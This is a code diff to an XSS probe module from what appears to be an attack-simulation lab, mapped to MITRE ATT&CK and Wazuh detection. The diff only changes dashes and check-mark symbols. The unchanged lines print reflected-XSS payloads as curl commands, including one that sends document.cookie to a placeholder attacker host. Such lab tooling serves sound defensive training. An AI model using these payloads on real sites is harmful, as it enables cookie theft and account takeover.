@@ -1,5 +1,5 @@
 """
-modules/xss.py - APP-01: Reflected Cross-Site Scripting probe.
+modules/xss.py — APP-01: Reflected Cross-Site Scripting probe.
 
 Target: GET /search?q=<payload>
 Vulnerability: q is rendered unsanitized into HTML response.
@@ -33,7 +33,7 @@ class XSSModule(BaseModule):
     category = Category.WEB
     scenario_id = "APP-01"
     severity = Severity.HIGH
-    # MITRE ATT&CK - find the reflection (recon) then execute attacker JS in-browser.
+    # MITRE ATT&CK — find the reflection (recon) then execute attacker JS in-browser.
     mitre = {
         "tactics": ["TA0043 Reconnaissance", "TA0002 Execution"],
         "techniques": [
@@ -55,11 +55,11 @@ class XSSModule(BaseModule):
             {"action": "Recon: confirm the q parameter is reflected into the response.",
              "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
              "command": "curl -s 'http://target-agent/search?q=attense_probe' | grep -o attense_probe",
-             "expected": "The marker 'attense_probe' is echoed inside the results area - input is reflected."},
+             "expected": "The marker 'attense_probe' is echoed inside the results area — input is reflected."},
             {"action": "Test that HTML is not escaped (markup injection).",
              "technique": "T1059.007 Command and Scripting Interpreter: JavaScript",
              "command": "curl -s -G http://target-agent/search --data-urlencode 'q=<b>ATT</b>' | grep '<b>ATT</b>'",
-             "expected": "The raw <b> tag comes back un-escaped - the page renders bold text."},
+             "expected": "The raw <b> tag comes back un-escaped — the page renders bold text."},
             {"action": "Execute a script payload (reflected XSS).",
              "technique": "T1059.007 Command and Scripting Interpreter: JavaScript",
              "command": "curl -s -G http://target-agent/search --data-urlencode \"q=<script>alert('XSS-LAB-01')</script>\"",
@@ -67,7 +67,7 @@ class XSSModule(BaseModule):
             {"action": "Try filter-evasion variants that survive naive escaping.",
              "technique": "T1059.007 Command and Scripting Interpreter: JavaScript",
              "command": "curl -s -G http://target-agent/search --data-urlencode 'q=<img src=x onerror=alert(document.domain)>'",
-             "expected": "The img/onerror handler is reflected - multiple sinks are exploitable."},
+             "expected": "The img/onerror handler is reflected — multiple sinks are exploitable."},
             {"action": "Weaponise: a victim who opens the crafted URL runs your JS (cookie theft).",
              "technique": "T1189 Drive-by Compromise",
              "command": "# http://target-agent/search?q=<script>new Image().src='//attacker/c?'+document.cookie</script>",
@@ -75,7 +75,7 @@ class XSSModule(BaseModule):
         ],
         "detection_rule": "Wazuh web attack signature (XSS / script tag in URL)",
         "success_markers": [
-            "PASS REFLECTED in the activity log",
+            "✓ REFLECTED in the activity log",
             "Raw <script> / onerror visible in the response body",
             "Wazuh alert on the /search request",
         ],
@@ -107,7 +107,7 @@ class XSSModule(BaseModule):
             'command': "curl -s -G http://target-agent/search --data-urlencode 'q=<img src=x onerror=alert(document.domain)>'",
             'hint': 'Exact payload string present unescaped in response body',
             'expected': 'XSS confirmed on the matching payload',
-            'markers': ['PASS REFLECTED', 'payloads reflected', 'Complete -'],
+            'markers': ['✓ REFLECTED', 'payloads reflected', 'Complete —'],
         },
     ]
 
@@ -137,12 +137,12 @@ class XSSModule(BaseModule):
         if custom:
             payloads.append(custom)
 
-        # -- Recon (T1595.002): baseline reflection probe before weaponising --
+        # ── Recon (T1595.002): baseline reflection probe before weaponising ──
         self._log(log_fn, "Recon: probing /search with a benign marker (attense_probe)...")
         base = self._get(target.base_url + endpoint, params={"q": "attense_probe"},
                          label="recon-baseline", timeout=target.timeout)
         if "attense_probe" in (base.detail or ""):
-            base.evidence = "Input reflected - endpoint is a candidate for XSS."
+            base.evidence = "Input reflected — endpoint is a candidate for XSS."
         steps.append(base)
 
         self._log(log_fn, f"Running {len(payloads)} XSS payloads against {endpoint}")
@@ -158,8 +158,8 @@ class XSSModule(BaseModule):
                 reflected_count += 1
                 r.evidence = f"REFLECTED: {payload[:40]}"
 
-            symbol = "PASS REFLECTED" if reflected else "- not reflected"
-            self._log(log_fn, f" [{i}/{len(payloads)}] {symbol} | {payload[:50]}")
+            symbol = "✓ REFLECTED" if reflected else "– not reflected"
+            self._log(log_fn, f"  [{i}/{len(payloads)}] {symbol}  |  {payload[:50]}")
             steps.append(r)
 
         summary = f"{reflected_count}/{len(payloads)} payloads reflected in response."
